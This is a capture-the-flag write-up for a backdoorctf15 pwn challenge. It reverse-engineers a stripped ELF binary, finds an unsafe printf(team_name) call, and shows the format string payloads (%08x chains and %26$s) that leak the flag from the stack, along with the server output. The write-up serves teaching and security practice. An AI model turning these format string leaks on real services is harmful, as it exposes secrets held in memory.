team
====

Link: https://backdoor.sdslabs.co/challenges/TEAM \
Tags: [backdoorctf15] [pwn]

Description:
------------

Analyze an ELF executable file to find a vulnerability in a service running on a remote server.

Solution:
---------

The binary file has been stripped, so there aren't any useful labels in here. However, it's not too difficult to work out what's happening. The code at the program's entry point pushes the address of `sub_8048770()` onto the stack before jumping to `libc_start_main`, so let's start by renaming `sub_8048770()` to `main()`.

It's easy to see that the `main()` function asks the user to enter two strings corresponding to the team_name (max 199 chars) and flag (max 99 chars), which are stored on the heap. Then, after a 2 second sleep, it passes these strings as parameters to `sub_80486ab()`, which should probably be called `check_flag()`.

The `check_flag()` function performs the following steps:

1. Open "flag.txt" and read its contents into an array on the stack
2. Print the team name to stdout
3. Check the flag entered by the user against the contents of flag.txt. If it matches, print "correct flag!". Otherwise print "incorrect flag. Try again."

This is what the output of the program normally looks like:

```
$ nc hack.bckdr.in 16009
Enter teamname: foo
Enter flag: bar
foo : incorrect flag. Try again.
```

But there's a format string vulnerability at step 2. Instead of `printf("%s", team_name);`, the programmer appears to have written `printf(team_name);`. That means we can stuff the team name with format conversion specifiers to see what else is on the stack

```
$ nc hack.bckdr.in 16009
Enter teamname: %08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x
Enter flag: woot
0000006409364150f7dfa7f4f7f5ba7008048240093620d8093620080804a0240936415035663364643630313765313932346137383565626361353061383564643862313131646138376661356363663138336666643263363336353533353962663137ff987a00 : incorrect flag. Try again.
```

If you convert that output from hex into ASCII, you should see something that looks very much like a sha256 hash. But don't forget to fix the endianness first. If that gives you any trouble, it might help to print out some of the flag as a string variable instead. Try entering `%26$s` as the team name, for example. It's a bit hit-and-miss, and I wasn't able to print out the entire flag this way. But it should show you how to reassemble the flag from the data you already have.
